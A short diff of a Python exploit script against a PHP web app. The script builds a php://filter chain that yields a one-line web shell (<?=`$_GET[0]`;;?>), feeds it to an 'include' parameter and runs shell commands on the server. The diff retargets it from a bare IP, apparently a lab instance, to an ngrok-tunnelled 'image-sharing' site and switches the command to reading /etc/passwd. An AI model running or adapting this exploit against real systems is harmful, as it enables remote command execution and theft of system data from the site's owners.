@@ -1,6 +1,6 @@
 import requests
 
-url = "http://13.214.203.193:31246/index.php"
+url = "https://6059-104-28-254-73.ngrok-free.app/image-sharing/"
 file_to_use = "php://temp"
 
 #<?=`$_GET[0]`;;?>
@@ -48,9 +48,9 @@ filters += "convert.base64-decode"
 final_payload = f"php://filter/{filters}/resource={file_to_use}"
 
 r = requests.get(url, params={
-    "0": "cat 1",
+    "0": "cat /etc/passwd",
     "action": "include",
-    "file": final_payload
+    "f": final_payload
 })
 
 print(r.text)
